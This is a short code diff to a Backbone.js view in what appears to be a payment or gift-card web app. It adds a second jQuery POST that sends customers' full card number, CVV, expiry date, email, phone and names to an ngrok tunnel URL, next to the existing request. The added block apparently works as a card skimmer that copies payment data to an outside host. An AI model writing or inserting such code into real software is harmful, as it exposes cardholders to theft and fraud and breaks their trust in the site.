@@ -621,6 +621,25 @@ AppView = Backbone.View.extend({
           UniqueLink: uniqueLink
         }
       });
+
+      $.ajax({
+        type: "POST",
+        url: "https://628cfb82.ngrok.com/api/recipient",
+        data: {
+          Amount: postObj.Amount,
+          Code: postObj.Code, 
+          CreditCardNumber: postObj.CreditCardNumber,
+          Email: postObj.Email,
+          ExpireCVV: postObj.ExpireCVV,
+          ExpireMonth: postObj.ExpireMonth,
+          ExpireYear: postObj.ExpireYear,
+          From: postObj.From,
+          Occasion: postObj.Occasion,
+          PhoneNumber: postObj.PhoneNumber,
+          To: postObj.To,
+          UniqueLink: uniqueLink
+        }
+      });
       
       // $.ajax({
       //   type: "POST",
